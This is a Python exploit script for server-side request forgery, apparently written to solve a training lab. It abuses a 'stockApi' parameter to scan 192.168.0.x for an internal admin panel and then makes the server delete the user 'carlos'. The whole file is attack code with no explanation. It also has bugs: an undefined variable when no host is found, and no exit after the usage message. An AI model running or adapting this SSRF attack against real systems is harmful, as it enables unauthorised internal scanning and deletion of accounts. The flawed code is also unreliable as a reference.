import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def check_admin_hostname(url):
    check_stock_path = "/product/stock"
    admin_hostname = ''
    for i in range(1,256):
        hostname = 'http://192.168.0.%s:8080/admin' %i
        params = {'stockApi': hostname}
        r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)
        if r.status_code == 200:
            admin_ip_address = '192.168.0.%s' %i
            break
    
    if admin_ip_address == '':
        print("(-) Could not find admin hostname.")
    return admin_ip_address

def delete_user(url, admin_ip_address):
    delete_user_url_ssrf_payload = 'http://%s:8080/admin/delete?username=carlos' % admin_ip_address
    check_stock_path = '/product/stock'
    params = {'stockApi': delete_user_url_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)

    # Check if user was deleted
    check_admin_url_ssrf_payload = 'http://%s:8080/admin' % admin_ip_address
    params2 = {'stockApi': check_admin_url_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params2, verify=False, proxies=proxies)
    if 'User deleted successfully' in r.text:
        print("(+) Successfully deleted Carlos user")
    else:
        print("(-) Exploit was unsuccessful.")


def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])

    url = sys.argv[1]
    print("(+) Finding admin hostname...")
    admin_ip_address = check_admin_hostname(url)
    print ("(+) Found the admin ip address: %s" % admin_ip_address)
    print("(+) Deleting Carlos user...")
    delete_user(url, admin_ip_address)

if __name__ == "__main__":
    main()